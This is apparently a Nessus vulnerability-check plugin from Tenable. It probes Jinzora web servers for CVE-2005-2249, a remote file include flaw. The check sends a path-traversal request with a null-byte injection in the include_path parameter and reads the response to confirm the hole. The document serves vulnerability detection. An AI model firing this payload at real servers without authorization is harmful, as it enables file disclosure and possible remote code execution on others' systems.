#
# (C) Tenable Network Security
#


if (description) {
  script_id(18653);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2249");
  script_bugtraq_id(14188);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"17736");

  name["english"] = "Jinzora include_path Variable File Include Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple remote file include issues. 

Description :

The remote host is running Jinzora, a web-based media streaming and
management system written in PHP. 

The installed version of Jinzora allows remote attackers to control
the 'include_path' variable used when including PHP code in several of
the application's scripts.  By leveraging this flaw, an attacker may
be able to view arbitrary files on the remote host and execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://freshmeat.net/projects/jinzora/?branch_id=43140&release_id=204535

Solution : 

Upgrade to Jinzora version 2.2 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for include_path variable file include vulnerabilities in Jinzora";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories (catch CMS installs too).
foreach dir (make_list(cgi_dirs(), "/modules/jinzora")) {
  # Try to exploit one of the flaws to read a file from the distribution.
  req = http_get(
    item:string(
      dir, "/backend/classes.php?",
      "include_path=../lib/jinzora.js%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # we get the file itself or...
    "function mediaPopupFromSelect" >< res ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(.+/jinzora\.js.+failed to open stream")
  ) {
    security_warning(port);
    exit(0);
  }
}
